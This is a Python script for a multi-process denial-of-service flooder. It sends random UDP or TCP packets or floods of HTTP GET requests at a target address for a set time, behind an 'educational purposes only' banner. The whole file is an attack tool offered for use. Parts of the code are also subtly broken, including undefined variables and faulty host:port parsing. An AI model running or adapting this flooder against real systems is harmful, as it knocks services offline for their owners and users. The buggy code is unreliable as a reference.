from asciiart import ascii_art
from help import help
from rich.console import Console
from rich.table import Table
from time import sleep
import random
import string
import sys
import requests
import multiprocessing
import socket
console = Console()

console.print("[bold green]"+ascii_art+"[/bold green]")

console.print("[bold red]\[!] This tool is for educational purposes only [!][/bold red]", justify="center")

if len(sys.argv) < 5:
    help(console)
    sys.exit(0)

method = sys.argv[1]
time = sys.argv[2]
threads = sys.argv[3]
ipaddress = sys.argv[4]

if method != "udp" and method != "tcp" and method != "http":
    help(console)
    console.print("[bold red]Error:[/bold red]")
    console.print(f"[red]Method '{method}' is not valid[/red]")
    console.print("")
    sys.exit(0)

table = Table(show_header=True, header_style="bold magenta")
table.add_column("IP Address")
table.add_column("Method", justify="center")
table.add_column("Time", justify="center")
table.add_column("Threads", justify="center")
table.add_row(
    ipaddress,
    method,
    time,
    threads
)

console.print(table)

def timer(time, status):
    jtime = int(time)
    status.update(f"{time} seconds remaining", spinner='material')
    for t in range(int(time)):
        sleep(1)
        jtime = jtime - 1
        status.update(f"{jtime} seconds remaining")
    status.update(f"[bold green]Attack completed![/bold green]", spinner=None)
    sys.exit(0)

def udp_attack(ip, time):
    data = random._urandom(1024)
    port = 80
    if ":" in ip:
        ip = ip.split(":")[0]
        port = ip.split(":")[1]
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
        except:
            s.close()

def tcp_attack(ip, time):
    data = random._urandom(1024)
    port = 80
    if ":" in ip:
        ip = ip.split(":")[0]
        port = ip.split(":")[1]
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"TCP Sent!!!")
        except:
            s.close()
            print("[*] Error")
        
def http_attack(url, time):
    host = str(url).replace("https://", "").replace("http://", "").replace("www.", "").replace("/","")
    port = 80
    if ":" in host:
        host = host.split(":")[0]
        port = host.split(":")[1]
    ip = socket.gethostbyname(host)
    while 1:
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:

            msg = str(string.ascii_letters + string.digits + string.punctuation)
            url_path = "".join(random.sample(msg, 5))
            
            dos.connect((ip, port))
            byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
            dos.send(byt)
        except socket.error:
            console.print(f"[red]Server may be down: {str(socket.error)}[/red]")
        finally:
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()

with console.status("Initializing attack") as status:

    plist = []

    if method == "udp":
        status.update("Starting UDP attack...")
        p = 0
        for thread in range(int(threads)):
            p = p + 1
            proc = multiprocessing.Process(target=udp_attack, args=[ipaddress, time])
            proc.start()
            plist.append(proc)
            status.update(f"#{p} thread started...")

    if method == "tcp":
        status.update("Starting TCP attack...")
        p = 0
        for thread in range(int(threads)):
            p = p + 1
            proc = multiprocessing.Process(target=tcp_attack, args=[ipaddress, time])
            proc.start()
            plist.append(proc)
            status.update(f"#{p} thread started...")

    if method == "http":
        status.update("Starting HTTP attack...")
        p = 0
        for thread in range(int(threads)):
            p = p + 1
            proc = multiprocessing.Process(target=http_attack, args=[ipaddress, time])
            proc.start()
            plist.append(proc)
            status.update(f"#{p} thread started...")

    status.update(f"All threads have been started successfully")
    try:
        timer(time, status)
    except KeyboardInterrupt:
        console.print("[bold red]Force quit...[/bold red]")
        for proc in plist:
            proc.terminate()
        sys.exit(0)
    for proc in plist:
        proc.terminate()
    sys.exit(0)
